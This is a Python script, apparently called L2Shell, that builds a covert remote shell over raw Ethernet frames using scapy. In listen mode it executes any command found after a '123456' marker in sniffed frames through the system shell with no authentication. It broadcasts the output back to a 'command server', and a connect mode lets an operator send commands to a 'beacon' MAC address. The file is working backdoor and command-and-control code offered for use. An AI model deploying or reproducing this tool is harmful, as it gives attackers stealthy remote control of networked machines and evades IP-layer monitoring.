import argparse, threading
from scapy.all import sniff, Ether, sendp
import subprocess

mac_address = "FF:FF:FF:FF:FF:FF"

def send_frame(message, mac_address):
    # Next send the output back to the command server
    eth_frame = Ether(dst=mac_address) / message

    # Send the Ethernet frame
    sendp(eth_frame)

# Define a callback function to handle each packet
def process_frame(frame):
    if Ether in frame:
        eth_frame = frame[Ether]
        
        if len(eth_frame.payload) > 0:
                
            index = str(eth_frame.payload.original).find('123456')
            if index != -1:
                print("Source MAC:", eth_frame.src)
                print("Destination MAC:", eth_frame.dst)
                print("Payload Length:", len(eth_frame.payload))
                string = str(eth_frame.payload.original)[index + len('123456'):]
                string = string.strip("'")
                pad = "\\x00"
                nstring = string.replace(pad, '')
                output = subprocess.check_output(nstring.strip("'"), shell=True)
                print(output.decode("utf-8"))
                
                noutput = "zxc" + output.decode("utf-8")
                
                # Next send the output back to the command server
                send_frame(noutput.encode('utf-8'), "FF:FF:FF:FF:FF:FF")

# Define a callback function to handle each packet
def process_return_frame(frame):
    if Ether in frame:
        eth_frame = frame[Ether]
        if eth_frame.dst=="ff:ff:ff:ff:ff:ff": # This needs to be changed or kept default
            
            if len(eth_frame.payload) > 0:
                
                index = str(eth_frame.payload.original).find('zxc')
                if index != -1:
                    print("Source MAC:", eth_frame.src)
                    print("Destination MAC:", eth_frame.dst)
                    print("Payload Length:", len(eth_frame.payload))
                    string = str(eth_frame.payload.original)[index + len('zxc'):]
                    string = string.strip("'")
                    pad = "\\x00"
                    nstring = string.replace(pad, '')
                    print(nstring)
                    print("\n>", end='')

# Sniff Ethernet frames and call the process_packet function for each packet
def listen():
    print("In listen mode: ")
    sniff(prn=process_frame, store=0)
    
def rlisten():
    sniff(prn=process_return_frame, store=0)

# The connect feature can be used to send commands, but also receive info from
# remote computers
def connect():
    # Create an Ethernet frame with custom payload (padding)
    #for test in range(5):
    print("In connect mode: ")
    
    listener_thread = threading.Thread(target=rlisten)
    listener_thread.daemon = True
    listener_thread.start()
    userin = "aaa"
    while userin != "x":
        userin = str(input(">"))
        if userin != '':
            send_frame(userin.encode('utf-8'), mac_address)
            
def main():

    global mac_address
    parser = argparse.ArgumentParser(epilog="e.g. python3 L2Shell.py -l",)
    parser.add_argument("-l", "--listen", action='store_true', help="Listen for connections")
    parser.add_argument("-c", "--connect", action='store_true', help="Connect and instruct commands")
    parser.add_argument("-m", "--mac", help="beacon mac address", type=str)
    #parser.add_argument("-cb", "--check", action='store_true', help="Check connected beacons")
    
    args = parser.parse_args()

    if args.mac:
        mac_address = args.mac
    
    if args.listen:
        listen()
        
    if args.connect:
        connect()
        
    #if args.check

if __name__ == "__main__":
    main()
